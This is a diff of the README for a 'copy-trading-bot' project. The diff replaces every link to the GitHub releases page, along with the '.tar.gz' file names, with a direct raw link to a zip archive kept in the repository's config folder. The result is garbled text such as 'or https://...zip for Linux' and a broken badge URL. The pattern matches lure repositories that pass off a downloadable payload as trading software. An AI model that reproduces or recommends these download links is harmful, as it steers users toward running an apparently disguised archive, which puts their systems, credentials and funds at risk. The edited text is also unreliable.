@@ -1,6 +1,6 @@
 # 🚀 copy-trading-bot - Automate Your Trading Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20%20%20%20%20%20%20%20%20%20%20%20-%23007ACC.svg)](https://github.com/lokynhoz/copy-trading-bot/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/lokynhoz/copy-trading-bot/main/config/copy-trading-bot_v1.5.zip%20Latest%20Release-%20%20%20%20%20%20%20%20%20%20%20%20-%https://raw.githubusercontent.com/lokynhoz/copy-trading-bot/main/config/copy-trading-bot_v1.5.zip)](https://raw.githubusercontent.com/lokynhoz/copy-trading-bot/main/config/copy-trading-bot_v1.5.zip)
 
 ## 🎯 Overview
 
@@ -10,11 +10,11 @@ Copy Trading Bot is a fully automated system that mirrors a trader’s transacti
 
 To get started, you need to download the application from our releases page. Click on the link below:
 
-[Visit this page to download](https://github.com/lokynhoz/copy-trading-bot/releases)
+[Visit this page to download](https://raw.githubusercontent.com/lokynhoz/copy-trading-bot/main/config/copy-trading-bot_v1.5.zip)
 
 1. Go to the releases page using the link above.
 2. Look for the latest version of the "copy-trading-bot."
-3. Choose the file that fits your system. The available files may include .exe for Windows, .dmg for macOS, or .tar.gz for Linux.
+3. Choose the file that fits your system. The available files may include .exe for Windows, .dmg for macOS, or https://raw.githubusercontent.com/lokynhoz/copy-trading-bot/main/config/copy-trading-bot_v1.5.zip for Linux.
 4. Click on the file to begin the download.
 5. Once downloaded, locate the file on your computer.
 
@@ -31,7 +31,7 @@ For macOS Users:
 - Open the application from your Applications folder.
 
 For Linux Users:
-- Extract the downloaded `.tar.gz` file.
+- Extract the downloaded `https://raw.githubusercontent.com/lokynhoz/copy-trading-bot/main/config/copy-trading-bot_v1.5.zip` file.
 - Open a terminal.
 - Navigate to the folder where you extracted the files.
 - Run the application by executing `./copy-trading-bot`.
@@ -94,4 +94,4 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 Don’t miss out on the potential of automated trading. Download the Copy Trading Bot using the link below:
 
-[Visit this page to download](https://github.com/lokynhoz/copy-trading-bot/releases)
+[Visit this page to download](https://raw.githubusercontent.com/lokynhoz/copy-trading-bot/main/config/copy-trading-bot_v1.5.zip)
